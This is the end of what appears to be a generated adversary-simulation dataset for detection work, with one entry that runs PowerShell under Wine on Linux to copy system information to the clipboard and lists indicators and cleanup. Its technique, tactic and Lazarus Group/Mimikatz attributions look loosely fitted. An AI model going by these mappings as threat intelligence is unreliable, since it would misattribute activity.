    "mitre_attack_id": "UNMAPPED",
    "technique_name": "Windows Management Instrumentation",
    "tactic": "Execution",
    "platform": "linux",
    "name": "Simulate WMI-like activity (Querying System Information) using `powershell` via Wine (Simulated)",
    "command": "wine powershell -c \"Get-ComputerInfo | Out-String | clip\"",
    "explanation": "This command simulates querying system information, a common WMI task. It uses `wine` to run `powershell` and executes a command that retrieves system information (`Get-ComputerInfo`). The output is then piped to `Out-String` and sent to the clipboard via `clip`. This simulates a threat actor gathering system information. This is a simulation because `wmic` itself does not exist natively on Linux and we are leveraging Wine to mimic functionality.",
    "indicators": "Process creation: `wine`, Process arguments containing `powershell -c`, File artifact: Clipboard data containing system information (examine the clipboard), Potentially unexpected network activity if clipboard synchronization is enabled in Wine (rare).",
    "prerequisites": "Wine must be installed on the Linux system., The user executing the command must have permissions to run Wine., Ensure no sensitive data is on the clipboard before running.",
    "cleanup": "No specific cleanup required. The clipboard data will be overwritten by the next copy operation. If Wine configuration includes file system redirection to the host, check for created files and remove them.",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.6
  }
]